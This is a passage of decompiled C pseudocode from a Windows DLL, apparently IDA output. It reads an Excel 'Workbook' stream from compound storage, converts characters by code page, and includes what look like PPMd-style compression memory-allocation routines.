// 10194F10: using guessed type int dword_10194F10;

//----- (1008ACB0) --------------------------------------------------------
int __cdecl sub_1008ACB0(WCHAR *pwcsName, int *a2, _DWORD *a3)
{
  int v3; // ecx
  int v5; // esi
  _BYTE *v6; // ebx
  int v7; // eax
  int v8; // [esp+18h] [ebp-38h] BYREF
  size_t Size; // [esp+1Ch] [ebp-34h] BYREF
  int v10; // [esp+20h] [ebp-30h]
  HGLOBAL hMem; // [esp+24h] [ebp-2Ch]
  _BYTE *v12; // [esp+28h] [ebp-28h]
  IStorage *ppstgOpen; // [esp+2Ch] [ebp-24h] BYREF
  int v14; // [esp+30h] [ebp-20h]
  int v15; // [esp+34h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+38h] [ebp-18h]

  ppstgOpen = 0;
  v15 = 0;
  v12 = 0;
  v10 = 0;
  hMem = 0;
  ms_exc.registration.TryLevel = 0;
  if ( v3 && a3 && a2 )
  {
    dword_10194F04 = v3;
    *a3 = 0;
    dword_10194F10 = 0;
    memset(&dword_10186498, 0, 0x30u);
    dword_101864C8 = *a2;
    if ( dword_101864C8 )
    {
      if ( pwcsName && StgOpenStorage(pwcsName, 0, 0x10040u, 0, 0, &ppstgOpen) < 0 )
        sub_1008AC12(0xE0000003);
      if ( ppstgOpen->lpVtbl->OpenStream(ppstgOpen, aWorkbook, 0, 16, 0, (IStream **)&v15) < 0 )
        sub_1008AC12(0xE0000004);
      if ( !sub_1008AC44(&Size, v15) )
        sub_1008AC12(0xE0000005);
      v5 = Size;
      if ( Size > 0x500000 )
        sub_1008AC12(0xE0000007);
      v6 = malloc(v5);
      v12 = v6;
      if ( !v6 )
        sub_1008AC12(0xE000000B);
      memset(v6, 0, v5);
      if ( (*(int (__stdcall **)(int, _BYTE *, int, int *))(*(_DWORD *)v15 + 12))(v15, v6, v5, &v8) < 0 || v8 != v5 )
        sub_1008AC12(0xE0000006);
      dword_10186498 = (int)v6;
      dword_1018649C = v5;
      sub_1008A057(v6);
      Size = sub_1008AB6B();
      sub_1008AF82(L"|/|/|/|/|", 9);
      sub_1008AC31();
      v7 = 0;
      v14 = 0;
      while ( v7 < (int)Size )
      {
        sub_1008A7DC(v7);
        sub_1008AF82(L"|/|/|/|/|", 9);
        sub_1008AC31();
        v7 = ++v14;
      }
      *a3 = dword_10194F10;
      ms_exc.registration.TryLevel = -2;
      if ( hMem )
        GlobalFree(hMem);
      if ( ppstgOpen )
        ppstgOpen->lpVtbl->Release(ppstgOpen);
      if ( v15 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v15 + 8))(v15);
      if ( v6 )
        free(v6);
      return v10;
    }
    else
    {
      ms_exc.registration.TryLevel = -2;
      return -536870887;
    }
  }
  else
  {
    ms_exc.registration.TryLevel = -2;
    return -536870884;
  }
}
// 1008AEC4: conditional instruction was optimized away because %var_40.4==0
// 1008ACD8: variable 'v3' is possibly undefined
// 100FC420: using guessed type wchar_t asc_100FC420[10];
// 1017E7A8: using guessed type wchar_t aWorkbook[9];
// 10186498: using guessed type int dword_10186498;
// 1018649C: using guessed type int dword_1018649C;
// 101864C8: using guessed type int dword_101864C8;
// 10194F04: using guessed type int dword_10194F04;
// 10194F10: using guessed type int dword_10194F10;

//----- (1008AEFA) --------------------------------------------------------
int __cdecl sub_1008AEFA(unsigned __int16 a1)
{
  int v1; // ebx
  unsigned int v2; // ebx
  int v3; // edi

  v1 = a1;
  if ( a1 >= 0xA0u )
  {
    if ( dword_101864CC )
    {
      v2 = a1 - 160;
      if ( v2 >= 0x241 )
        goto LABEL_8;
      v1 = *(char *)(dword_101864CC + v2);
      if ( v1 == 58 )
        goto LABEL_8;
    }
    else
    {
      v3 = (a1 | 0x3000u) >> 6;
      if ( a1 >= 0x800u )
      {
        sub_1008AC82((a1 | 0xE0000) >> 12);
        v3 = ((a1 | 0x3000u) >> 6) & 0x3F | 0x80;
      }
      sub_1008AC82(v3);
      v1 = a1 & 0x3F | 0x80;
    }
  }
  else if ( a1 < 0x20u || a1 >= 0x7Fu )
  {
LABEL_8:
    v1 = 32;
  }
  return sub_1008AC82(v1);
}
// 101864CC: using guessed type int dword_101864CC;

//----- (1008AF82) --------------------------------------------------------
unsigned __int16 *__usercall sub_1008AF82@<eax>(unsigned __int16 *a1@<eax>, int a2)
{
  while ( --a2 >= 0 )
    sub_1008AEFA(*a1++);
  return a1;
}

//----- (1008AF9D) --------------------------------------------------------
void __usercall sub_1008AF9D(int a1@<eax>)
{
  int v1; // ecx
  _WORD *v2; // eax

  switch ( a1 )
  {
    case 1200:
      v1 = 128;
      v2 = &unk_10184620;
      do
        *v2++ = v1++;
      while ( (int)v2 <= (int)&unk_1018471E );
      dword_101864D0 = (int)&unk_10184620;
      break;
    case 1250:
    case 32769:
      dword_101864D0 = (int)&unk_1017E4D8;
      break;
    case 1252:
      dword_101864D0 = (int)&unk_1017E5D8;
      break;
    default:
      if ( a1 != 367 )
        sub_1008AC12(0xE0000010);
      break;
  }
}
// 101864D0: using guessed type int dword_101864D0;

//----- (1008B002) --------------------------------------------------------
unsigned __int8 *__usercall sub_1008B002@<eax>(int a1@<eax>, unsigned __int8 *a2@<ecx>)
{
  unsigned __int8 *v2; // esi
  unsigned int v3; // edi
  unsigned __int8 v4; // al

  v2 = a2;
  v3 = (unsigned int)&a2[a1];
  if ( a2 < &a2[a1] )
  {
    do
    {
      v4 = *v2++;
      if ( v4 > 0x7Fu )
      {
        if ( dword_101864D0 )
        {
          sub_1008AEFA(*(_WORD *)(dword_101864D0 + 2 * v4 - 256));
          continue;
        }
      }
      else if ( v4 != 127 && v4 >= 0x20u )
      {
        goto LABEL_6;
      }
      v4 = 32;
LABEL_6:
      sub_1008AC82(v4);
    }
    while ( (unsigned int)v2 < v3 );
  }
  return v2;
}
// 101864D0: using guessed type int dword_101864D0;

//----- (1008B04D) --------------------------------------------------------
int __usercall sub_1008B04D@<eax>(int result@<eax>, _DWORD *a2@<ecx>)
{
  int v2; // edx

  v2 = a2[5];
  if ( v2 >= a2[3] )
    return -1;
  *(_BYTE *)(v2 + a2[1]) = result;
  ++a2[5];
  return (unsigned __int8)result;
}

//----- (1008B06A) --------------------------------------------------------
unsigned int sub_1008B06A()
{
  unsigned int result; // eax

  result = dword_101855F8 / (unsigned int)dword_10185708;
  dword_10185324 += dword_10185700 * (dword_101855F8 / (unsigned int)dword_10185708);
  dword_101855F8 = dword_101855F8 / (unsigned int)dword_10185708 * (dword_10185704 - dword_10185700);
  return result;
}
// 10185324: using guessed type int dword_10185324;
// 101855F8: using guessed type int dword_101855F8;
// 10185700: using guessed type int dword_10185700;
// 10185704: using guessed type int dword_10185704;
// 10185708: using guessed type int dword_10185708;

//----- (1008B09A) --------------------------------------------------------
_DWORD *__usercall sub_1008B09A@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edx
  _DWORD *result; // eax
  int v7; // esi
  int *v8; // edx
  int *v9; // edx

  v3 = (unsigned __int8)byte_10185540[a1];
  v4 = (unsigned __int8)byte_10185540[a2] - v3;
  v5 = *((unsigned __int8 *)&dword_1018556C + v4 + 3);
  result = (_DWORD *)(a3 + 12 * v3);
  if ( (unsigned __int8)byte_10185540[v5] != v4 )
  {
    v7 = (unsigned __int8)byte_1018553F[v5];
    v8 = &dword_101939E8[2 * v5 - 2];
    result[1] = v8[1];
    v8[1] = (int)result;
    *result = -1;
    result[2] = v7;
    ++*v8;
    result += 3 * v7;
    v4 -= v7;
  }
  v9 = &dword_101939E8[2 * *((unsigned __int8 *)&dword_1018556C + v4 + 3)];
  result[1] = v9[1];
  v9[1] = (int)result;
  *result = -1;
  result[2] = v4;
  ++*v9;
  return result;
}
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B110) --------------------------------------------------------
int sub_1008B110()
{
  int result; // eax
  unsigned int i; // ecx

  result = dword_10130320 + dword_10185328 + dword_10186390 - dword_1018443C - dword_1018556C;
  for ( i = 0; i < 0x26; ++i )
    result += -12 * dword_101939E8[2 * i] * (unsigned __int8)byte_10185540[i];
  return result;
}
// 10130320: using guessed type int dword_10130320;
// 1018443C: using guessed type int dword_1018443C;
// 10185328: using guessed type int dword_10185328;
// 1018556C: using guessed type int dword_1018556C;
// 10186390: using guessed type int dword_10186390;
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B14A) --------------------------------------------------------
void sub_1008B14A()
{
  if ( dword_10130320 )
  {
    dword_10130320 = 0;
    j__free(dword_1018532C);
  }
}
// 10130320: using guessed type int dword_10130320;

//----- (1008B167) --------------------------------------------------------
unsigned int sub_1008B167()
{
  unsigned int result; // eax

  memset(dword_101939E8, 0, 0x130u);
  dword_10186390 = (int)dword_1018532C;
  dword_10185438 = 0;
  dword_1018556C = (int)dword_1018532C + dword_10130320;
  result = 84 * (((unsigned int)dword_10130320 >> 3) / 0xC);
  dword_1018443C = (int)dword_1018532C + dword_10130320 - result;
  dword_10185328 = (int)dword_1018532C + dword_10130320 - result;
  return result;
}
// 10130320: using guessed type int dword_10130320;
// 1018443C: using guessed type int dword_1018443C;
// 10185328: using guessed type int dword_10185328;
// 10185438: using guessed type int dword_10185438;
// 1018556C: using guessed type int dword_1018556C;
// 10186390: using guessed type int dword_10186390;
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B1B9) --------------------------------------------------------
int *sub_1008B1B9()
{
  int *result; // eax
  int *v1; // esi
  int *v2; // edx
  int v3; // ecx
  int v4; // ecx
  int *v5; // ecx
  _DWORD *v6; // ecx
  unsigned int v7; // esi
  int v8; // edi
  int v9; // edx
  char *v10; // esi
  int v11; // eax
  _DWORD *v12; // edx
  _DWORD *v13; // eax
  int v14; // esi
  int v15; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v16; // [esp+10h] [ebp-Ch]
  int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h]

  result = (int *)dword_10185328;
  v15 = 0;
  v17 = 0;
  if ( dword_10185328 != dword_1018556C )
    *(_BYTE *)dword_10185328 = 0;
  v1 = &v15;
  v16 = 0;
  v2 = &dword_101939EC;
  v18 = 38;
  do
  {
    while ( *v2 )
    {
      result = (int *)*v2;
      v3 = *(_DWORD *)(*v2 + 4);
      --*(v2 - 1);
      *v2 = v3;
      v4 = result[2];
      if ( v4 )
      {
        while ( 1 )
        {
          v5 = &result[3 * v4];
          if ( *v5 != -1 )
            break;
          result[2] += v5[2];
          v5[2] = 0;
          v4 = result[2];
        }
        result[1] = v1[1];
        v1[1] = (int)result;
        v1 = result;
      }
    }
    v2 += 2;
    --v18;
  }
  while ( v18 );
  while ( v16 )
  {
    v6 = v16;
    v16 = (_DWORD *)v16[1];
    result = (int *)v6[2];
    if ( result )
    {
      if ( (unsigned int)result > 0x80 )
      {
        v7 = (((unsigned int)result - 129) >> 7) + 1;
        do
        {
          v6[1] = dword_10193B14;
          dword_10193B14 = (int)v6;
          *v6 = -1;
          v6[2] = 128;
          ++dword_10193B10;
          result -= 32;
          v6 += 384;
          --v7;
        }
        while ( v7 );
      }
      v8 = *((unsigned __int8 *)result + (_DWORD)&dword_1018556C + 3);
      if ( (int *)(unsigned __int8)byte_10185540[v8] != result )
      {
        v9 = (unsigned __int8)byte_1018553F[v8--];
        v10 = (char *)result - v9;
        v11 = 3 * v9;
        v12 = (_DWORD *)((char *)&unk_101939E0 + 8 * (_DWORD)v10);
        v13 = &v6[v11];
        v13[1] = v12[1];
        v12[1] = v13;
        *v13 = -1;
        v13[2] = v10;
        ++*v12;
      }
      v14 = (unsigned __int8)byte_10185540[v8];
      result = &dword_101939E8[2 * v8];
      v6[1] = result[1];
      result[1] = (int)v6;
      *v6 = -1;
      v6[2] = v14;
      ++*result;
    }
  }
  dword_10185438 = 0x2000;
  return result;
}
// 10185328: using guessed type int dword_10185328;
// 10185438: using guessed type int dword_10185438;
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC;
// 10193B10: using guessed type int dword_10193B10;
// 10193B14: using guessed type int dword_10193B14;

//----- (1008B2FE) --------------------------------------------------------
int __usercall sub_1008B2FE@<eax>(int a1@<ebx>)
{
  int v1; // edi
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int *v6; // eax
  int v7; // esi
  int v8; // ecx
  int v9; // eax

  v1 = a1;
  if ( dword_10185438 || (sub_1008B1B9(), v2 = 2 * a1, !dword_101939EC[2 * a1]) )
  {
    while ( ++v1 != 38 )
    {
      if ( dword_101939EC[2 * v1] )
      {
        v6 = &dword_101939E8[2 * v1];
        v7 = v6[1];
        v8 = *(_DWORD *)(v7 + 4);
        --*v6;
        v6[1] = v8;
        sub_1008B09A(a1, v1, v7);
        return v7;
      }
    }
    v9 = 12 * (unsigned __int8)byte_10185540[a1];
    --dword_10185438;
    if ( dword_1018443C - dword_10186390 <= v9 )
    {
      return 0;
    }
    else
    {
      dword_1018443C -= v9;
      return dword_1018443C;
    }
  }
  else
  {
    v3 = &dword_101939E8[v2];
    result = dword_101939E8[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  return result;
}
// 1018443C: using guessed type int dword_1018443C;
// 10185438: using guessed type int dword_10185438;
// 10186390: using guessed type int dword_10186390;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC[];

//----- (1008B393) --------------------------------------------------------
int __usercall sub_1008B393@<eax>(int a1@<eax>)
{
  int v1; // ebx
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int v6; // ecx

  v1 = *((unsigned __int8 *)&dword_1018556C + a1 + 3);
  v2 = 2 * v1;
  if ( dword_101939EC[2 * v1] )
  {
    v3 = &dword_101939E8[v2];
    result = dword_101939E8[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  else
  {
    v6 = 12 * (unsigned __int8)byte_10185540[v1];
    result = dword_10185328;
    dword_10185328 += v6;
    if ( dword_10185328 > (unsigned int)dword_1018556C )
    {
      dword_10185328 -= v6;
      return sub_1008B2FE(v1);
    }
  }
  return result;
}
// 10185328: using guessed type int dword_10185328;
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC[];

//----- (1008B3EB) --------------------------------------------------------
int sub_1008B3EB()
{
  int result; // eax
  int v1; // ecx

  if ( dword_1018556C == dword_10185328 )
  {
    result = dword_101939EC[0];
    if ( dword_101939EC[0] )
    {
      v1 = *(_DWORD *)(dword_101939EC[0] + 4);
      --dword_101939E8[0];
      dword_101939EC[0] = v1;
    }
    else
    {
      return sub_1008B2FE(0);
    }
  }
  else
  {
    result = dword_1018556C - 12;
    dword_1018556C -= 12;
  }
  return result;
}
// 10185328: using guessed type int dword_10185328;
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC[];

//----- (1008B424) --------------------------------------------------------
_DWORD *__usercall sub_1008B424@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax
  char *v6; // edx

  v4 = a2;
  result = (_DWORD *)(a1 + 8);
  v6 = (char *)a2 - a1;
  do
  {
    *v4 = *(result - 2);
    v4[1] = *(result - 1);
    *(_DWORD *)((char *)result + (_DWORD)v6) = *result;
    v4 += 3;
    result += 3;
    --a3;
  }
  while ( a3 );
  return result;
}

//----- (1008B44C) --------------------------------------------------------
_DWORD *__usercall sub_1008B44C@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  int v2; // ebx
  _DWORD *v4; // edx
  int *v5; // eax
  _DWORD *v6; // [esp+4h] [ebp-4h]

  v2 = byte_10185570[a1 - 1];
  if ( v2 == byte_10185570[a1] )
    return a2;
  v4 = (_DWORD *)sub_1008B393(a1 + 1);
  v6 = v4;
  if ( v4 )
  {
    sub_1008B424((int)a2, v4, a1);
    v5 = &dword_101939E8[2 * v2];
    a2[1] = v5[1];
    v5[1] = (int)a2;
    *a2 = -1;
    a2[2] = a1;
    ++*v5;
  }
  return v6;
}
// 10185570: using guessed type unsigned __int8 byte_10185570[128];
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B49E) --------------------------------------------------------
_DWORD *__usercall sub_1008B49E@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>)
{
  int v3; // edi
  int v4; // eax
  int v5; // ecx
  int *v6; // eax
  _DWORD *v7; // ebx
  int v8; // ecx
  int *v9; // eax
  int v10; // ecx

  v3 = *((unsigned __int8 *)&dword_1018556C + a1 + 3);
  v4 = *((unsigned __int8 *)&dword_1018556C + a2 + 3);
  if ( v3 != v4 )
  {
    v5 = 2 * v4;
    if ( dword_101939EC[2 * v4] )
    {
      v6 = &dword_101939E8[v5];
      v7 = (_DWORD *)dword_101939E8[v5 + 1];
      v8 = v7[1];
      --*v6;
      v6[1] = v8;
      sub_1008B424((int)a3, v7, a2);
      v9 = &dword_101939E8[2 * v3];
      v10 = (unsigned __int8)byte_10185540[v3];
      a3[1] = v9[1];
      v9[1] = (int)a3;
      *a3 = -1;
      a3[2] = v10;
      ++*v9;
      return v7;
    }
    sub_1008B09A(v4, v3, (int)a3);
  }
  return a3;
}
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC[];

//----- (1008B50D) --------------------------------------------------------
int *__usercall sub_1008B50D@<eax>(int a1@<eax>, _DWORD *a2@<ecx>)
{
  int v2; // eax
  int v3; // edx
  int *result; // eax

  v2 = *((unsigned __int8 *)&dword_1018556C + a1 + 3);
  v3 = (unsigned __int8)byte_10185540[v2];
  result = &dword_101939E8[2 * v2];
  a2[1] = result[1];
  result[1] = (int)a2;
  *a2 = -1;
  a2[2] = v3;
  ++*result;
  return result;
}
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B536) --------------------------------------------------------
_DWORD *__usercall sub_1008B536@<eax>(_DWORD *result@<eax>)
{
  if ( result == (_DWORD *)dword_1018443C )
  {
    *result = -1;
    dword_1018443C += 12;
  }
  else
  {
    result[1] = dword_101939EC;
    dword_101939EC = (int)result;
    *result = -1;
    result[2] = 1;
    ++dword_101939E8[0];
  }
  return result;
}
// 1018443C: using guessed type int dword_1018443C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC;

//----- (1008B568) --------------------------------------------------------
_DWORD *__usercall sub_1008B568@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  _DWORD *v5; // edx
  int v6; // ecx
  int v7; // eax
  _DWORD *v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  v2 = *((unsigned __int8 *)&dword_1018556C + a2 + 3);
  v3 = dword_1018443C;
  v10 = v2;
  if ( (unsigned int)a1 > dword_1018443C + 0x4000 )
    return a1;
  v4 = 2 * v2;
  if ( (unsigned int)a1 > dword_101939EC[2 * v2] )
    return a1;
  v5 = (_DWORD *)dword_101939EC[2 * v2];
  v6 = v5[1];
  --dword_101939E8[2 * v2];
  dword_101939EC[2 * v2] = v6;
  v9 = v5;
  sub_1008B424((int)a1, v5, a2);
  v7 = (unsigned __int8)byte_10185540[v10];
  if ( a1 == (_DWORD *)v3 )
  {
    dword_1018443C = 12 * v7 + v3;
  }
  else
  {
    a1[1] = dword_101939EC[v4];
    dword_101939EC[v4] = (int)a1;
    *a1 = -1;
    a1[2] = v7;
    ++dword_101939E8[v4];
  }
  return v9;
}
// 1018443C: using guessed type int dword_1018443C;
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];
// 101939EC: using guessed type int dword_101939EC[];

//----- (1008B5F9) --------------------------------------------------------
int *sub_1008B5F9()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edx
  int v2; // edi
  _DWORD *v3; // ecx
  _DWORD *v4; // ecx
  int *v5; // edx
  int v6; // edi
  int *result; // eax
  _DWORD v9[38]; // [esp+Ch] [ebp-20h] BYREF

  memset(v9, 0, sizeof(v9));
  v0 = (_DWORD *)dword_1018443C;
  v1 = (_DWORD *)dword_1018443C;
  if ( *(_DWORD *)dword_1018443C == -1 )
  {
    do
    {
      v2 = v0[2];
      v0 += 3 * v2;
      v3 = &v9[*((unsigned __int8 *)&dword_1018556C + v2 + 3)];
      ++*v3;
      *v1 = 0;
      v1 = v0;
    }
    while ( *v0 == -1 );
    dword_1018443C = (int)v0;
  }
  v4 = v9;
  v5 = dword_101939E8;
  v6 = 38;
  do
  {
    result = v5;
    while ( *v4 )
    {
      do
      {
        if ( *(_DWORD *)result[1] )
          break;
        result[1] = *(_DWORD *)(result[1] + 4);
        --*v5;
      }
      while ( (*v4)-- != 1 );
      result = (int *)result[1];
    }
    v5 += 2;
    ++v4;
    --v6;
  }
  while ( v6 );
  return result;
}
// 1018443C: using guessed type int dword_1018443C;
// 1018556C: using guessed type int dword_1018556C;
// 101939E8: using guessed type int dword_101939E8[];

//----- (1008B689) --------------------------------------------------------
void *sub_1008B689()
{
  int v0; // esi
  int v1; // eax
  unsigned int v2; // ecx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  unsigned int i; // edx
  _BYTE *v8; // ecx
  unsigned int v9; // ecx
  unsigned int j; // eax
  int v11; // edx
  char v12; // al
  int v13; // esi

  v0 = 4;
  v1 = 1;
  v2 = 4;
  do
  {
    byte_10185540[v1 - 1] = v1;
    ++v1;
    --v0;
  }
  while ( v0 );
  v3 = v1 + 1;
  do
  {
    byte_10185540[v2++] = v3;
    v3 += 2;
  }
  while ( v2 < 8 );
  v4 = v3 + 1;
  while ( v2 < 0xC )
  {
    byte_10185540[v2++] = v4;
    v4 += 3;
  }
  v5 = v4 + 1;
  while ( v2 < 0x26 )
  {
    byte_10185540[v2++] = v5;
    v5 += 4;
  }
  v6 = 0;
  for ( i = 0; i < 0x80; ++i )
  {
    v8 = (char *)&unk_10185570 + i;
    v6 += (unsigned __int8)byte_10185540[v6] < i + 1;
    *v8 = v6;
  }
  byte_10185440 = 0;
  byte_10185441 = 2;
  memset(&unk_10185442, 4, 9u);
  memset(&unk_1018544B, 6, 0xF5u);
  v9 = 5;
  for ( j = 0; j < 5; ++j )
    byte_10185330[j] = j;
  v11 = 1;
  v12 = 5;
  v13 = 1;
  do
  {
    --v11;
    byte_10185330[v9] = v12;
    if ( !v11 )
    {
      v11 = ++v13;
      ++v12;
    }
    ++v9;
  }
  while ( v9 < 0x104 );
  dword_10186394 = -2069057649;
  return &unk_10193B18;
}
// 10185440: using guessed type char byte_10185440;
// 10185441: using guessed type char byte_10185441;
// 10186394: using guessed type int dword_10186394;

//----- (1008B774) --------------------------------------------------------
char *__userpurge sub_1008B774@<eax>(int a1@<eax>, int a2)
{
  char *result; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  unsigned int i; // eax
  _WORD *v8; // ebx
  char *v9; // eax
  _WORD *v10; // esi
  unsigned int j; // ecx
  char *v12; // esi
  int v13; // edi
  unsigned __int8 v14; // dl
  int v15; // esi
  _DWORD *v16; // ecx
  int v17; // edi
  char *v18; // [esp+8h] [ebp-8h]
  int v19; // [esp+8h] [ebp-8h]
  int v20; // [esp+Ch] [ebp-4h]
  unsigned int v21; // [esp+18h] [ebp+8h]
  int v22; // [esp+18h] [ebp+8h]

  memset(byte_10185600, 0, 0x100u);
  byte_1018443B = 1;
  byte_101842E1 = 1;
  if ( a1 >= 2 )
  {
    dword_1018570C = a1;
    dword_101855F4 = a1;
    dword_10185568 = a2;
    sub_1008B167();
    if ( a1 >= 12 )
      a1 = 12;
    dword_10185320 = -1 - a1;
    dword_1018543C = -1 - a1;
    v4 = sub_1008B3EB();
    dword_101855F0 = v4;
    *(_DWORD *)(v4 + 8) = 0;
    *(_BYTE *)v4 = -1;
    *(_WORD *)(v4 + 2) = 257;
    v5 = sub_1008B393(128);
    v6 = 0;
    *(_DWORD *)(v4 + 4) = v5;
    byte_101842E3 = 0;
    for ( i = 0; i < 0x600; i += 6 )
    {
      *(_BYTE *)(i + *(_DWORD *)(v4 + 4)) = v6;
      *(_BYTE *)(*(_DWORD *)(v4 + 4) + i + 1) = 1;
      *(_DWORD *)(*(_DWORD *)(v4 + 4) + i + 2) = 0;
      ++v6;
    }
    v21 = 0;
    v20 = 0;
    v18 = byte_10185330;
    v8 = &unk_10185710;
    do
    {
      v9 = v18;
      while ( (unsigned __int8)*v9 == v21 )
      {
        v9 = &byte_10185330[++v20];
        v18 = &byte_10185330[v20];
      }
      v10 = v8;
      for ( j = 0; j < 8; ++j )
        *v10++ = 0x4000 - (unsigned __int16)word_101047C0[j] / (unsigned int)(v20 + 1);
      v12 = (char *)(v8 + 8);
      v13 = 7;
      do
      {
        memcpy(v12, v8, 0x10u);
        v12 += 16;
        --v13;
      }
      while ( v13 );
      ++v21;
      v8 += 64;
    }
    while ( v21 < 0x19 );
    v14 = byte_10185333;
    v15 = 0;
    v22 = 3;
    result = (char *)&unk_10184720;
    v19 = 24;
    do
    {
      while ( v14 == v22 )
        v14 = byte_10185334[v15++];
      *(_WORD *)result = 16 * v15 + 40;
      result[2] = 3;
      result[3] = 7;
      v16 = result + 4;
      v17 = 31;
      do
      {
        *v16++ = *(_DWORD *)result;
        --v17;
      }
      while ( v17 );
      ++v22;
      result += 128;
      --v19;
    }
    while ( v19 );
  }
  else
  {
    dword_101855F4 = dword_1018570C;
    result = (char *)dword_101855F0;
    while ( 1 )
    {
      result = (char *)*((_DWORD *)result + 2);
      if ( !result )
        break;
      --dword_101855F4;
    }
  }
  return result;
}
// 101047C0: using guessed type __int16 word_101047C0[];
// 101842E1: using guessed type char byte_101842E1;
// 101842E3: using guessed type char byte_101842E3;
// 1018443B: using guessed type char byte_1018443B;
// 10185320: using guessed type int dword_10185320;
// 10185333: using guessed type char byte_10185333;
// 1018543C: using guessed type int dword_1018543C;
// 10185568: using guessed type int dword_10185568;
// 101855F0: using guessed type int dword_101855F0;
// 101855F4: using guessed type int dword_101855F4;
// 1018570C: using guessed type int dword_1018570C;

//----- (1008B927) --------------------------------------------------------
_BYTE *__userpurge sub_1008B927@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3)
{
  _BYTE *result; // eax
  int v4; // esi
  char v5; // cl
  int v6; // ecx
  int v7; // esi
  int v8; // edx
  int v9; // ecx
  int v10; // edx
  int v11; // [esp+4h] [ebp-4h]

  v11 = *a2;
  result = sub_1008B49E(a3, (v11 + 2) >> 1, *((_DWORD **)a2 + 1));
  v4 = *((unsigned __int16 *)a2 + 1);
  v5 = a2[1] & (4 * (a1 + 4));
  *((_DWORD *)a2 + 1) = result;
  a2[1] = 8 * (*result >= 0x40u) + v5;
  v6 = (unsigned __int8)result[1];
  v7 = v4 - v6;
  v8 = (v6 + a1) >> a1;
  result[1] = v8;
  *((_WORD *)a2 + 1) = (unsigned __int8)v8;
  do
  {
    v9 = (unsigned __int8)result[7];
    result += 6;
    v7 -= v9;
    v10 = (v9 + a1) >> a1;
    result[1] = v10;
    *((_WORD *)a2 + 1) += (unsigned __int8)v10;
    a2[1] |= 8 * (*result >= 0x40u);
    --v11;
  }
  while ( v11 );
  *((_WORD *)a2 + 1) += (a1 + v7) >> a1;
  return result;
}

//----- (1008B9B7) --------------------------------------------------------
unsigned __int8 *__thiscall sub_1008B9B7(unsigned __int8 *this, int a2)
{
  char *v3; // eax
  int v4; // ebx
  char *v5; // edi
  int v6; // eax
  __int16 v7; // cx
  _DWORD *v8; // ecx
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]

  if ( !*this )
  {
    if ( *((_DWORD *)this + 1) >= (unsigned int)dword_1018443C )
    {
      *((_DWORD *)this + 1) = a2 >= dword_1018570C ? 0 : sub_1008B9B7(a2 + 1);
      if ( *((_DWORD *)this + 1) || a2 <= 9 )
        return this;
    }
LABEL_21:
    sub_1008B536(this);
    return 0;
  }
  v10 = (*this + 2) >> 1;
  v3 = (char *)sub_1008B568(*((_DWORD **)this + 1), v10);
  v4 = *this;
  v5 = &v3[6 * v4];
  *((_DWORD *)this + 1) = v3;
  if ( v5 >= v3 )
  {
    v11 = 6 * v4;
    do
    {
      if ( *(_DWORD *)(v5 + 2) >= (unsigned int)dword_1018443C )
      {
        if ( a2 >= dword_1018570C )
          *(_DWORD *)(v5 + 2) = 0;
        else
          *(_DWORD *)(v5 + 2) = sub_1008B9B7(a2 + 1);
      }
      else
      {
        *(_DWORD *)(v5 + 2) = 0;
        v6 = v11 + *((_DWORD *)this + 1);
        v7 = *(_WORD *)v5;
        *(_WORD *)v5 = *(_WORD *)v6;
        *(_DWORD *)(v5 + 2) = *(_DWORD *)(v6 + 2);
        *(_DWORD *)(v6 + 2) = 0;
        --v4;
        v11 -= 6;
        *(_WORD *)v6 = v7;
      }
      v5 -= 6;
    }
    while ( (unsigned int)v5 >= *((_DWORD *)this + 1) );
  }
  if ( v4 == *this || !a2 )
    return this;
  v8 = (_DWORD *)*((_DWORD *)this + 1);
  *this = v4;
  if ( v4 < 0 )
  {
    sub_1008B50D(v10, v8);
    goto LABEL_21;
  }
  if ( v4 )
  {
    sub_1008B927(*((unsigned __int16 *)this + 1) > 16 * v4, this, v10);
  }
  else
  {
    this[1] = (this[1] & 0x10) + 8 * (*(_BYTE *)v8 >= 0x40u);
    *((_WORD *)this + 1) = *(_WORD *)v8;
    *((_DWORD *)this + 1) = *(_DWORD *)((char *)v8 + 2);
